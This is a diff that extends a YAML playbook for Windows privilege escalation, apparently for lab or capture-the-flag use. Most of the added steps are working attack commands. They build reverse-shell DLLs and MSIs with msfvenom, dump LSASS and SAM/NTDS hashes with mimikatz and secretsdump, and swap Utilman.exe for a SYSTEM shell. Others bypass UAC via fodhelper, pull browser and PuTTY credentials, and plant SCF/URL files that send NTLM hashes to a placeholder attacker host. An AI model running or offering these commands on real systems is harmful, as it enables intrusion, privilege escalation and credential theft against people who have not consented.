@@ -26,6 +26,17 @@ steps:
       - "accesschk.exe /accepteula -uwcqv * *"
       - "Get-Service | Where-Object {$_.Status -eq 'Running'}"
 
+  - id: weak-acls
+    name: "Weak File/Folder ACLs"
+    phase: enumeration
+    description: "Find writable service binaries, program files, and DLL directories"
+    commands:
+      - "icacls \"C:\\Program Files\\*\" /T /C 2>nul | findstr /i \"(F) (M) (W) :\" | findstr /i \":\ everyone authenticated users todos\""
+      - "SharpUp.exe audit"
+      - "PowerUp.ps1: Get-ModifiableServiceFile"
+      - "icacls <service_binary_path>"
+      - "Replace writable service binary with payload, restart service"
+
   - id: unquoted-paths
     name: "Unquoted Service Paths"
     phase: enumeration
@@ -33,6 +44,17 @@ steps:
     commands:
       - "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\""
       - "Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike 'C:\\Windows*' -and $_.PathName -match ' ' }"
+
+  - id: dll-hijacking
+    name: "DLL Hijacking"
+    phase: exploitation
+    description: "Place malicious DLLs in application search paths"
+    commands:
+      - "Use procmon.exe: filter for NAME NOT FOUND on .dll files"
+      - "DLL search order: application dir → C:\\Windows\\System32 → C:\\Windows\\System → C:\\Windows → PATH dirs"
+      - "msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijacked.dll"
+      - "Place DLL in writable directory from search path"
+      - "Restart service or wait for application to load the DLL"
 
   - id: scheduled-tasks
     name: "Scheduled Tasks"
@@ -51,6 +73,23 @@ steps:
       - "reg query HKLM /f password /t REG_SZ /s 2>nul | head -30"
       - "findstr /si password *.txt *.xml *.ini *.config"
       - "Get-ChildItem -Path C:\\ -Recurse -Include *.txt,*.xml,*.config -ErrorAction SilentlyContinue | Select-String -Pattern password"
+      - "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
+      - "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul | findstr /i DefaultPassword"
+      - "Unattended install files: C:\\Unattend.xml, C:\\Windows\\Panther\\Unattend.xml"
+      - "runas /savecred /user:DOMAIN\\USER cmd.exe (if cmdkey shows stored creds)"
+
+  - id: browser-creds
+    name: "Browser & Application Credentials"
+    phase: credential-access
+    description: "Extract credentials from browsers, PuTTY, and other applications"
+    commands:
+      - "SharpChrome.exe logins"
+      - "SharpChrome.exe cookies"
+      - "LaZagne.exe all"
+      - "SessionGopher.ps1 -Thorough"
+      - "Chrome dictionary: type \"C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Custom Dictionary.dcit\""
+      - "PuTTY sessions: reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions"
+      - "FileZilla: type \"C:\\Users\\*\\AppData\\Roaming\\FileZilla\\recentservers.xml\""
 
   - id: always-install-elevated
     name: "AlwaysInstallElevated"
@@ -59,6 +98,7 @@ steps:
     commands:
       - "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
       - "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+      - "If both = 1: msfvenom -p windows/shell_reverse_tcp -f msi -o evil.msi; msiexec /quiet /i evil.msi"
 
   - id: token-privs
     name: "Token Privileges"
@@ -69,6 +109,129 @@ steps:
       - "Check: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege"
       - "PrintSpoofer.exe -i -c cmd"
       - "GodPotato.exe -cmd 'cmd /c whoami'"
+      - "JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}"
+      - "RoguePotato.exe -r <attacker_ip> -e 'cmd.exe /c whoami' -l 9999"
+
+  - id: sedebug-priv
+    name: "SeDebugPrivilege"
+    phase: exploitation
+    description: "Dump LSASS memory for credentials when SeDebugPrivilege is enabled"
+    commands:
+      - "whoami /priv | findstr SeDebugPrivilege"
+      - "procdump.exe -ma lsass.exe lsass.dmp"
+      - "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" exit"
+      - "Alt: rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full"
+      - "Alt: Task Manager → lsass.exe → Create Dump File"
+
+  - id: setakeownership-priv
+    name: "SeTakeOwnershipPrivilege"
+    phase: exploitation
+    description: "Take ownership of protected files when SeTakeOwnershipPrivilege is enabled"
+    commands:
+      - "whoami /priv | findstr SeTakeOwnership"
+      - "takeown /f C:\\Windows\\System32\\Utilman.exe"
+      - "icacls C:\\Windows\\System32\\Utilman.exe /grant <user>:F"
+      - "copy cmd.exe C:\\Windows\\System32\\Utilman.exe"
+      - "Lock screen → click Ease of Access → get SYSTEM shell"
+      - "Alt target: C:\\Windows\\System32\\config\\SAM"
+
+  - id: sebackup-priv
+    name: "SeBackupPrivilege"
+    phase: exploitation
+    description: "Copy SAM/SYSTEM hives or NTDS.dit when SeBackupPrivilege is enabled"
+    commands:
+      - "whoami /priv | findstr SeBackup"
+      - "reg save HKLM\\SAM sam.bak"
+      - "reg save HKLM\\SYSTEM system.bak"
+      - "secretsdump.py -sam sam.bak -system system.bak LOCAL"
+      - "For DC: diskshadow to shadow copy C:\\ → robocopy /B to copy NTDS.dit"
+      - "secretsdump.py -ntds ntds.dit -system system.bak LOCAL"
+
+  - id: builtin-groups
+    name: "Built-in Group Abuse"
+    phase: enumeration
+    description: "Exploit membership in privileged built-in groups"
+    commands:
+      - "net localgroup"
+      - "whoami /groups"
+      # Backup Operators
+      - "Backup Operators: can read SAM/NTDS via SeBackupPrivilege (see sebackup-priv step)"
+      # DnsAdmins
+      - "DnsAdmins: dnscmd /config /serverlevelplugindll \\\\attacker\\share\\evil.dll"
+      - "sc stop dns && sc start dns (loads DLL as SYSTEM)"
+      # Server Operators
+      - "Server Operators: sc config <svc> binPath= \"cmd /c net localgroup administrators <user> /add\""
+      - "sc stop <svc> && sc start <svc>"
+      # Print Operators
+      - "Print Operators: can load kernel-mode drivers (SeLoadDriverPrivilege)"
+      # Event Log Readers
+      - "Event Log Readers: wevtutil qe Security /f:text | findstr /i password"
+      - "Get-WinEvent -FilterHashtable @{LogName='Security'} | Select-String password"
+      # Hyper-V Admins
+      - "Hyper-V Admins: clone DC virtual hard disk for offline NTDS.dit extraction"
+
+  - id: uac-bypass
+    name: "UAC Bypass"
+    phase: exploitation
+    description: "Bypass User Account Control to get elevated shell"
+    commands:
+      - "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+      - "Check ConsentPromptBehaviorAdmin value (0=no prompt, 5=default)"
+      - "fodhelper.exe method: REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d cmd.exe /f"
+      - "REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f"
+      - "Start fodhelper.exe → elevated cmd"
+      - "Alt: eventvwr.exe, DiskCleanup scheduled task, UACME tool"
+
+  - id: kernel-exploits
+    name: "Kernel Exploits"
+    phase: exploitation
+    description: "Check for kernel-level privilege escalation vulnerabilities"
+    commands:
+      - "systeminfo > systeminfo.txt"
+      - "wes.py systeminfo.txt -i 'Elevation of Privilege' (Windows Exploit Suggester)"
+      - "Watson.exe"
+      - "Sherlock.ps1: Find-AllVulns"
+      - "Check missing KBs against known exploits"
+
+  - id: vulnerable-software
+    name: "Vulnerable Third-Party Software"
+    phase: exploitation
+    description: "Find exploitable installed applications and services"
+    commands:
+      - "wmic product get name,version"
+      - "Get-WmiObject Win32_Product | Select Name,Version"
+      - "Get-Process | Select-Object Path"
+      - "Check versions against searchsploit"
+      - "Common targets: Druva inSync (RPC 6064), FileZilla, TeamViewer, various SCADA"
+
+  - id: user-interaction
+    name: "User Interaction Attacks"
+    phase: exploitation
+    description: "Capture credentials through user interaction or traffic"
+    commands:
+      # SCF file attack
+      - "SCF: echo [Shell] > file.scf && echo IconFile=\\\\<attacker>\\share\\icon >> file.scf"
+      - "Place .scf in writable share; capture NTLMv2 with Responder"
+      # URL file attack
+      - "URL: echo [InternetShortcut] > file.url && echo URL=file://\\\\<attacker>\\share >> file.url"
+      # Process cmdline monitoring
+      - "while($true){Get-WmiObject Win32_Process | Select CommandLine; sleep 5}"
+      # Network capture
+      - "net.exe use \\\\<attacker>\\share to trigger NTLM auth"
+
+  - id: pillaging
+    name: "Pillaging"
+    phase: post-exploitation
+    description: "Search for valuable data, configs, and credentials post-compromise"
+    commands:
+      - "Snaffler.exe -s -o snaffler.log"
+      - "findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml"
+      - "Get-ItemProperty HKLM:\\SOFTWARE\\*"
+      - "Get-ChildItem C:\\Users\\*\\Documents\\Outlook\\ -Recurse"
+      - "Get-Clipboard"
+      - "Get-WindowsFeature (server roles)"
+      - "IIS web.config: type C:\\inetpub\\wwwroot\\web.config"
+      - "type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString"
 
   - id: automated-enum
     name: "Automated Enumeration"
@@ -77,6 +240,8 @@ steps:
     commands:
       - ".\\winPEASx64.exe"
       - "PowerUp.ps1: Invoke-AllChecks"
+      - "Seatbelt.exe -group=all"
+      - "JAWS.ps1"
 
   - id: admin-flag
     name: "Capture Admin Flag"
